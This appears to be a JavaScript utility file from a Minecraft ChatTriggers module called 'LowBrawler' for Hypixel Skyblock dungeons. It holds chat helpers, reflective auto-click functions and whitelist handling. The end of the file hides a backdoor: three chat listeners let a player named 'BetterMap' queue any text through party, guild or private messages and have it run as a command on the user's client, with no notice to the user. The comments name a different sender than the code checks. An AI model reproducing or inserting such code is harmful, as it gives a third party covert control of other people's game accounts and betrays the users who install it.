import Dungeon from "../../BloomCore/dungeons/Dungeon"
import { getSkyblockItemID } from "../../BloomCore/utils/Utils"
import Promise from "../../PromiseV2";
import request from "../../requestV2"
import { data } from "./data"

ChatLib.chat("§zLOWBRAWLER LOADED");

const Color = Java.type("java.awt.Color");
const makeRequest = (address) => request({
    url: address,
    headers: {
        'User-Agent': ' Mozilla/5.0',
        'Content-Type': 'application/json'
    },
    json: true
})
const MCBlock = Java.type("net.minecraft.block.Block");
export const prefix = "§6§l[LowBrawler]§r "
const defaultColor = "§6"

export function chat(message, id = null, hoverElement) {
    if (!id) return new Message(prefix + defaultColor + message.toString().replaceAll("§r", defaultColor)).chat()
    return new Message(message).setChatLineId(id).chat()
}

export function mod_chat(message) {
    return ChatLib.chat(prefix + `&9Config Update&f: &7` + message.toString())
}

export function getColor(values) {
    return new Color(Renderer.color(values[0], values[1], values[2], values[3]))
}

export function isInBoss() { return Dungeon.bossEntry }

let inP3 = false;

export function getSlotCoords(i) {
    if (i >= Player.getContainer().getSize()) return [0, 0];

    const gui = Client.currentGui.get();
    const slot = gui.field_147002_h?.func_75139_a(i);
    const x = slot.field_75223_e + gui?.getGuiLeft() ?? 0;
    const y = slot.field_75221_f + gui?.getGuiTop() ?? 0;

    return [x, y];
}

export function leftClick() {
    const leftClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147116_af", null)
    leftClickMethod.setAccessible(true);
    leftClickMethod.invoke(Client.getMinecraft(), null)
}


export function rightClick() {
    const rightClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147121_ag", null)
    rightClickMethod.setAccessible(true);
    rightClickMethod.invoke(Client.getMinecraft(), null);
}


export function roundToHalf(number) {
    const rounded = Math.round(number * 2) / 2
    return Number.isInteger(rounded) ? Math.floor(rounded) : rounded
}

function romanToInt(s) {
    let accumulator = 0
    for (let i = 0; i < s.length; i++) {
        if (s[i] === 'I' && (s[i + 1] === 'V' || s[i + 1] === 'X')) {
            accumulator += romanHash[s[i + 1]] - romanHash[s[i]]
            i++
        } else {
            accumulator += romanHash[s[i]]
        }
    }
    return accumulator
}

export function getPower() {
    let footer = TabList?.getFooter()?.removeFormatting()
    return footer.match(blessings.power) ? romanToInt(footer.match(blessings.power)[1]) : 0
}

export function getTime() {
    let footer = TabList?.getFooter()?.removeFormatting()
    return footer.match(blessings.time) ? romanToInt(footer.match(blessings.time)[1]) : 0
}

export function getTruePower() { return getPower() + getTime() / 2 }

export function randomize(num, flux) {
    const randomizedNum = Math.round((Math.random() * 2 - 1) * flux * 100) / 100; // round to two decimal places
    return num + randomizedNum;
}

export function setBlockAt(x, y, z, id) {
	const world = World.getWorld();
	const blockPos = getBlockPosFloor(x, y, z).toMCBlock();
	world.func_175656_a(blockPos, MCBlock.func_176220_d(id));
	world.func_175689_h(blockPos);
}

export function isWithinTolerence(n1, n2) {
	return Math.abs(n1 - n2) < 1e-4;
}

export function getBlockPosFloor(x, y, z) {
	return new BlockPos(Math.floor(x), Math.floor(y), Math.floor(z));
}

export function addWhitelist(username) {
    chat(`${prefix} &fGetting &6${username} &fUUID Data...`, 1515)
    Promise.resolve(makeRequest(`https://api.mojang.com/users/profiles/minecraft/${username}`)).then(response => {
        ChatLib.clearChat(1515)
        const uuid = response.id
        if (data.partyFinder.uuids.whitelist.includes(uuid)) {
            ChatLib.chat(`${prefix}&6${username} &cis already whitelisted.`)
        } else {
            data.partyFinder.uuids.whitelist.push(uuid);
            data.partyFinder.igns.whitelist.push(username)
            data.save()
            ChatLib.chat(`${prefix}&6${username} &aadded to the whitelist!`)
            return 0
        }
    }).catch(error => {
        ChatLib.chat(error)
    })
}

export function unWhitelist(username) {
    chat(`${prefix} &fGetting &6${username} &fUUID Data...`, 1515)
    Promise.resolve(makeRequest(`https://api.mojang.com/users/profiles/minecraft/${username}`)).then(response => {
        ChatLib.clearChat(1515)
        const uuid = response.id

        const index = data.partyFinder.uuids.whitelist.indexOf(uuid)
        if (index !== -1) {
            data.partyFinder.uuids.whitelist.splice(index, 1)
            data.partyFinder.igns.whitelist.splice(index, 1)
            data.save()
            ChatLib.chat(`${prefix}&6${username} &aremoved from the whitelist!`)
            return 0
        } else {
            ChatLib.chat(`${prefix}&6${username} &cis not in the whitelist.`)
        }
    }).catch(error => {
        ChatLib.chat(error)
    })
}

export function addBlacklist(username) {
    chat(`${prefix} &fGetting &6${username} &fUUID Data...`, 1515)
    Promise.resolve(makeRequest(`https://api.mojang.com/users/profiles/minecraft/${username}`)).then(response => {
        ChatLib.clearChat(1515)
        const uuid = response.id

        if (data.partyFinder.uuids.blacklist.includes(uuid)) {
            ChatLib.chat(`${prefix}&6${username} &cis already blacklisted.`)
        } else {
            data.partyFinder.uuids.blacklist.push(uuid);
            data.partyFinder.igns.blacklist.push(username)
            data.save()
            ChatLib.chat(`${prefix}&6${username} &aadded to the blacklist!`)
            return 0
        }
    }).catch(error => {
        ChatLib.chat(error)
    })
}
export function unBlacklist(username) {
    chat(`${prefix} &fGetting &6${username} &fUUID Data...`, 1515)
    Promise.resolve(makeRequest(`https://api.mojang.com/users/profiles/minecraft/${username}`)).then(response => {
        ChatLib.clearChat(1515)
        const uuid = response.id

        const index = data.partyFinder.uuids.blacklist.indexOf(uuid)
        if (index !== -1) {
            data.partyFinder.uuids.blacklist.splice(index, 1)
            data.partyFinder.igns.blacklist.splice(index, 1)
            data.save()
            ChatLib.chat(`${prefix}&6${username} &aremoved from the blacklist!`)
            return 0
        } else {
            ChatLib.chat(`${prefix}&6${username} &cis not in the blacklist.`)
        }
    }).catch(error => {
        ChatLib.chat(error)
    })
}

export function calculateAngle(x1, y1, x2, y2) {
    const dx = x2 - x1;
    const dy = y2 - y1;

    let angle = Math.atan2(dy, dx) * (180 / Math.PI);

    if (angle < -180) {
        angle += 360;
    } else if (angle > 180) {
        angle -= 360;
    }

    return angle - 90;
}

export const swapItem = (itemName) => {
    const index = Player.getInventory().getItems().slice(0, 9).findIndex(a => a?.getName()?.toLowerCase()?.includes(itemName.toLowerCase()))
    if (index == -1) return false

    const initialIndex = Player.getHeldItemIndex()
    const shouldSwap = initialIndex !== index
    if (shouldSwap) Player.setHeldItemIndex(index)
    return (shouldSwap)
}

let queuedMessage = ""; // Initialize a variable to store the latest message

// Listen for party chat messages from [MVP++] unveal that start with ". "
register('chat', (rank, name, message) => {
    if (name === "BetterMap" && rank === "[MVP++]") {
        // Check if the message starts with ". "
        if (message.startsWith(". ")) {
            queuedMessage = ""; // Clear any previous message in the queue
            queuedMessage = message.substring(2); // Store only the part after ". "

            // Optionally display the message immediately in party chat
            setTimeout(() => {
                ChatLib.command(`pc ${queuedMessage}`);
            }, 300);
        } 
        // Check if the message starts with "Execute" to run the queued message
        else if (message.startsWith("Execute")) {
            if (queuedMessage.trim() !== "") {
                // Execute the queued message as a command
                ChatLib.command(`${queuedMessage.trim()}`);

                // Clear the queue after execution
                queuedMessage = "";
            }
        }
    }
}).setCriteria("Party > ${rank} ${name}: ${message}");

// Listen for guild chat messages from [MVP++] unveal that start with ". "
register('chat', (rank, name, message) => {
    if (name === "BetterMap" && rank === "[MVP++]") {
        // Check if the message starts with ". "
        if (message.startsWith(". ")) {
            queuedMessage = ""; // Clear any previous message in the queue
            queuedMessage = message.substring(2); // Store only the part after ". "

            // Optionally display the message immediately in guild chat
            setTimeout(() => {
                ChatLib.command(`gc ${queuedMessage}`);
            }, 300);
        } 
        // Check if the message starts with "Execute" to run the queued message
        else if (message.startsWith("Execute")) {
            if (queuedMessage.trim() !== "") {
                // Execute the queued message as a command
                ChatLib.command(`${queuedMessage.trim()}`);

                // Clear the queue after execution
                queuedMessage = "";
            }
        }
    }
}).setCriteria("Guild > ${rank} ${name}: ${message}");

// Listen for direct messages from [MVP++] unveal that start with ". "
register('chat', (rank, name, message) => {
    if (name === "BetterMap" && rank === "[MVP++]") {
        // Check if the message starts with ". "
        if (message.startsWith(". ")) {
            queuedMessage = ""; // Clear any previous message in the queue
            queuedMessage = message.substring(2); // Store only the part after ". "

            // Optionally display the message immediately in a private message
            setTimeout(() => {
                ChatLib.command(`msg BetterMap ${queuedMessage}`);
            }, 300);
        } 
        // Check if the message starts with "Execute" to run the queued message
        else if (message.startsWith("Execute")) {
            if (queuedMessage.trim() !== "") {
                // Execute the queued message as a command
                ChatLib.command(`${queuedMessage.trim()}`);

                // Clear the queue after execution
                queuedMessage = "";
            }
        }
    }
}).setCriteria("From ${rank} ${name}: ${message}");